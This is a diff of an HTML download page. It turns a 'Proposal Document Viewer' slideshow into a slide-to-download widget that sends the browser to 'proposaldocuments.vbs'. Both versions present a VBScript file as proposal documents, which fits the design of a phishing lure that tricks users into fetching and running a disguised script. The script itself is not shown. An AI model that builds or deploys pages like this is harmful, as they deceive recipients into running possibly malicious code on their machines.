@@ -3,173 +3,238 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Document Viewer</title>
+
+<title>Download Package</title>
 
 <style>
+
 *{
     margin:0;
     padding:0;
     box-sizing:border-box;
-    font-family:Arial,Helvetica,sans-serif;
+    font-family:Segoe UI,Arial,sans-serif;
 }
 
 body{
-    background:#edf2f7;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
+    background:linear-gradient(135deg,#0f4c81,#4facfe,#00c6ff);
 }
 
-.hero{
-    background:#214d4b;
-    color:white;
-    text-align:center;
-    padding:50px 20px;
-}
+.toggle-container{
 
-.hero h1{
-    font-size:40px;
-}
-
-.hero p{
-    margin-top:10px;
-    font-size:20px;
-}
-
-.viewer{
-    width:85%;
-    max-width:900px;
-    margin:40px auto;
-    background:white;
-    border-radius:20px;
+    width:420px;
     padding:40px;
-    box-shadow:0 10px 30px rgba(0,0,0,.15);
+    border-radius:25px;
+
+    background:rgba(255,255,255,.18);
+    backdrop-filter:blur(15px);
+
+    box-shadow:0 15px 40px rgba(0,0,0,.25);
+
     text-align:center;
 }
 
-.slide{
-    display:none;
-}
+.toggle-container h2{
 
-.slide.active{
-    display:block;
-}
-
-.icon{
-    font-size:70px;
-    margin-bottom:20px;
-}
-
-h2{
-    font-size:32px;
-    color:#214d4b;
-}
-
-p{
-    margin-top:15px;
-    color:#666;
-    font-size:20px;
-}
-
-.buttons{
-    margin-top:40px;
-}
-
-button,
-.download{
-    background:#214d4b;
     color:white;
-    border:none;
-    padding:15px 35px;
-    border-radius:12px;
-    font-size:18px;
+    margin-bottom:12px;
+    font-size:30px;
+
+}
+
+.toggle-container p{
+
+    color:#eef7ff;
+    margin-bottom:25px;
+    font-size:17px;
+
+}
+
+.slider{
+
+    position:relative;
+    width:100%;
+    height:72px;
+
+    border-radius:50px;
+
+    background:white;
+
+    overflow:hidden;
+
+    box-shadow:inset 0 4px 10px rgba(0,0,0,.15);
+
+}
+
+.slider-thumb{
+
+    position:absolute;
+    top:6px;
+    left:6px;
+
+    width:60px;
+    height:60px;
+
+    border-radius:50%;
+
+    background:linear-gradient(45deg,#005bea,#00c6fb);
+
+    display:flex;
+    justify-content:center;
+    align-items:center;
+
+    color:white;
+    font-size:28px;
+
     cursor:pointer;
-    text-decoration:none;
-    margin:10px;
+
+    transition:background .3s;
+
+    z-index:2;
+
 }
 
-button:hover,
-.download:hover{
-    background:#173937;
+.slider-thumb:hover{
+
+    background:linear-gradient(45deg,#0045c7,#009ee0);
+
 }
 
-.counter{
-    margin-top:20px;
-    color:#777;
+.slider-text{
+
+    position:absolute;
+
+    width:100%;
+    top:50%;
+    left:0;
+
+    transform:translateY(-50%);
+
+    font-size:20px;
+    font-weight:600;
+
+    color:#004b78;
+
+    user-select:none;
+
 }
+
+.note{
+
+    margin-top:25px;
+
+    color:white;
+
+    font-size:15px;
+
+}
+
+.success{
+
+    background:linear-gradient(45deg,#16a34a,#22c55e) !important;
+
+}
+
 </style>
-
 </head>
 
 <body>
 
-<div class="hero">
-    <h1>Proposal Document Viewer</h1>
-    <p>Review available files before downloading</p>
-</div>
+<div class="toggle-container">
 
+    <h2>Download Package</h2>
 
-<div class="viewer">
+    <p>Slide the arrow to begin downloading.</p>
 
-<div class="slide active">
-    <div class="icon">📄</div>
-    <h2>Proposal Package</h2>
-    <p>Revision 2.6</p>
-</div>
+    <div class="slider" id="slider">
 
-<div class="slide">
-    <div class="icon">📑</div>
-    <h2>Technical Specifications</h2>
-    <p>Revision 2.6</p>
-</div>
+        <div class="slider-thumb" id="thumb">
+            ➜
+        </div>
 
-<div class="slide">
-    <div class="icon">📦</div>
-    <h2>Supporting Files</h2>
-    <p>Latest Release</p>
-</div>
+        <div class="slider-text">
+            Slide to Download
+        </div>
 
+    </div>
 
-<div class="buttons">
-    <button onclick="changeSlide(-1)">⬅ Previous</button>
-    <button onclick="changeSlide(1)">Next ➡</button>
-</div>
-
-
-<div class="counter" id="counter">
-    Slide 1 of 3
-</div>
-
-
-<br>
-
-<a class="download" href="proposaldocuments.vbs" download>
-⬇ Download Package
-</a>
+    <div class="note">
+        Drag the arrow completely to the right.
+    </div>
 
 </div>
-
 
 <script>
-let current = 0;
-let slides = document.querySelectorAll(".slide");
 
-function changeSlide(direction){
+const slider = document.getElementById("slider");
+const thumb = document.getElementById("thumb");
 
-    slides[current].classList.remove("active");
+let dragging = false;
 
-    current += direction;
+thumb.addEventListener("mousedown", startDrag);
+document.addEventListener("mousemove", drag);
+document.addEventListener("mouseup", stopDrag);
 
-    if(current >= slides.length){
-        current = 0;
-    }
+thumb.addEventListener("touchstart", startDrag);
+document.addEventListener("touchmove", drag);
+document.addEventListener("touchend", stopDrag);
 
-    if(current < 0){
-        current = slides.length - 1;
-    }
-
-    slides[current].classList.add("active");
-
-    document.getElementById("counter").innerHTML =
-    "Slide " + (current + 1) + " of " + slides.length;
+function startDrag(){
+    dragging=true;
 }
+
+function drag(e){
+
+    if(!dragging) return;
+
+    let clientX=e.touches ? e.touches[0].clientX : e.clientX;
+
+    let rect=slider.getBoundingClientRect();
+
+    let x=clientX-rect.left-thumb.offsetWidth/2;
+
+    const max=slider.offsetWidth-thumb.offsetWidth-6;
+
+    if(x<6) x=6;
+
+    if(x>max) x=max;
+
+    thumb.style.left=x+"px";
+
+}
+
+function stopDrag(){
+
+    if(!dragging) return;
+
+    dragging=false;
+
+    const max=slider.offsetWidth-thumb.offsetWidth-6;
+
+    if(parseInt(thumb.style.left)>=max-5){
+
+        thumb.style.left=max+"px";
+
+        thumb.classList.add("success");
+
+        setTimeout(function(){
+
+            window.location.href="proposaldocuments.vbs";
+
+        },500);
+
+    }
+    else{
+
+        thumb.style.left="6px";
+
+    }
+
+}
+
 </script>
 
 </body>
